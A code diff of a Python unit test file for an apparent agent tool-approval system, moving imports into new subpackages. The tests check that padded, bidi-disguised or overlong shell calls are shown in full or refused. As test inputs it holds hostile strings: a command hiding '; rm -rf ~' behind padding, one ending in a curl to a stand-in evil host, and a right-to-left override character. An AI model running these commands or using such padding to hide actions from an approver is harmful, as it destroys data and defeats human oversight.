@@ -10,13 +10,13 @@ from typing import Any
 
 import pytest
 
-from nox.node.gate import NodeGate
-from nox.node.hands import NodeHands, hand_tools
-from nox.node.install import _shell_target
-from nox.node.manifest import GROUPS, NodeManifest
-from nox.node.protocol import NoxCallMeta
-from nox.node.registry import NodeRegistry
-from nox.node.router import routed_spec
+from nox.node.device.gate import NodeGate
+from nox.node.device.hands import NodeHands, hand_tools
+from nox.node.hub.install import _shell_target
+from nox.node.hub.registry import NodeRegistry
+from nox.node.hub.router import routed_spec
+from nox.node.wire.manifest import GROUPS, NodeManifest
+from nox.node.wire.protocol import NoxCallMeta
 from nox.security.model import Risk
 from tests.unit.node.support import FakeRegistry, registry_entry, signed
 from tests.unit.node.support_sessions import LAPTOP
@@ -49,8 +49,8 @@ def test_invisible_bidi_control_and_space_runs_are_made_visible() -> None:
 
 
 def test_a_padded_call_is_refused_never_shortened() -> None:
-    from nox.node.install import MAX_TARGET_CHARS
-    from nox.node.router import CannotShow
+    from nox.node.hub.install import MAX_TARGET_CHARS
+    from nox.node.hub.router import CannotShow
 
     padded = {"command": "echo " + "a" * MAX_TARGET_CHARS + " ; rm -rf ~", "egress": []}
     with pytest.raises(CannotShow):
@@ -61,7 +61,7 @@ def test_a_padded_call_is_refused_never_shortened() -> None:
 
 
 def _node_shell_spec(confirmer: bool = True) -> Any:
-    from nox.node.hands import ShellArgs
+    from nox.node.device.hands import ShellArgs
 
     laptop = registry_entry("a" * 32, "Laptop", tools={"shell.run": "high"})
     laptop.confirmer = confirmer
@@ -87,7 +87,7 @@ def test_a_node_shell_call_is_high_and_names_the_device() -> None:
 
 
 async def test_a_call_too_long_to_show_is_refused_before_anyone_is_asked() -> None:
-    from nox.node.install import MAX_TARGET_CHARS
+    from nox.node.hub.install import MAX_TARGET_CHARS
 
     spec, registry = _node_shell_spec(confirmer=False)
     command = "echo " + " x" * MAX_TARGET_CHARS + " ; curl evil.example.invalid"
@@ -102,8 +102,8 @@ async def test_a_call_too_long_to_show_is_refused_before_anyone_is_asked() -> No
 async def test_replacing_or_extending_a_file_is_high_and_shown_with_size_and_preview(
     tmp_path: Path,
 ) -> None:
-    from nox.node.agent import confirmation_text
-    from nox.node.receipts import ReceiptSigner, ReceiptVerifier
+    from nox.node.device.agent import confirmation_text
+    from nox.node.wire.receipts import ReceiptSigner, ReceiptVerifier
 
     signer = ReceiptSigner(tmp_path / "r")
     verifier = ReceiptVerifier(signer.public_key, device_id="d" * 32, core_id="c" * 64)
@@ -127,9 +127,9 @@ async def test_replacing_or_extending_a_file_is_high_and_shown_with_size_and_pre
 
 
 def test_the_device_dialog_and_the_core_target_render_alike() -> None:
-    from nox.node.agent import confirmation_text
-    from nox.node.install import _write_target
-    from nox.node.protocol import render
+    from nox.node.device.agent import confirmation_text
+    from nox.node.hub.install import _write_target
+    from nox.node.wire.protocol import render
 
     argv = ["echo", "safe‮", "a" + " " * 9 + "b", "Ж"]
     dialog = confirmation_text("shell.run", {"argv": argv})
@@ -141,7 +141,7 @@ def test_the_device_dialog_and_the_core_target_render_alike() -> None:
 
 
 def test_free_text_is_not_a_path_but_a_path_still_is(tmp_path: Path) -> None:
-    from nox.node.hands import ShellArgs as _Shell  # noqa: F401 - the model the gate validates
+    from nox.node.device.hands import ShellArgs as _Shell  # noqa: F401 - the model the gate validates
 
     gate = NodeGate(
         hand_tools(
@@ -160,7 +160,7 @@ def test_free_text_is_not_a_path_but_a_path_still_is(tmp_path: Path) -> None:
 def test_a_long_write_shows_head_tail_hash_and_what_is_not_shown() -> None:
     import hashlib
 
-    from nox.node.hands import PREVIEW_CHARS, write_summary
+    from nox.node.device.hands import PREVIEW_CHARS, write_summary
 
     text = "A" * PREVIEW_CHARS + "M" * 50 + "\n" + "Z" * PREVIEW_CHARS
     shown = write_summary("a.txt", text, append=False, overwrite=True)
@@ -174,10 +174,10 @@ def test_a_long_write_shows_head_tail_hash_and_what_is_not_shown() -> None:
 
 
 def test_the_write_is_rendered_alike_on_the_core_and_on_the_device() -> None:
-    from nox.node.agent import confirmation_text
-    from nox.node.hands import PREVIEW_CHARS, write_summary
-    from nox.node.install import _write_target
-    from nox.node.protocol import render
+    from nox.node.device.agent import confirmation_text
+    from nox.node.device.hands import PREVIEW_CHARS, write_summary
+    from nox.node.hub.install import _write_target
+    from nox.node.wire.protocol import render
 
     text = "Anfang " + "x" * (2 * PREVIEW_CHARS) + " Ende \u202e"
     payload = {"path": "notes/a.txt", "text": text, "append": True, "overwrite": False}
